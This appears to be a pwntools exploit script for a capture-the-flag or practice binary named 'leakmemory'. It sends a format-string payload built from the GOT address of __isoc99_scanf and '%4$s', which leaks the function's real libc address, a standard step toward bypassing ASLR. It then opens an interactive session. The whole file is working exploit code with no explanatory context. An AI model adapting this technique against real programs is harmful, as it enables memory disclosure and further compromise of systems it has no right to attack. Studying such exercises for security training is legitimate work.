from pwn import *

# context.arch = 'i386'
# context.log_level = 'debug'

sh = process('./leakmemory')
leakmemory = ELF('./leakmemory')

__isoc99_scanf_got = leakmemory.got['__isoc99_scanf']
print(f"__isoc99_scanf GOT address: {hex(__isoc99_scanf_got)}")

payload = p32(__isoc99_scanf_got) + b'%4$s'
print(f"Payload: {payload}")

sh.sendline(payload)

sh.recvuntil(b'%4$s\n')
received = sh.recv()
scanf_addr = u32(received[4:8])
print(f"Actual __isoc99_scanf address: {hex(scanf_addr)}")

sh.interactive()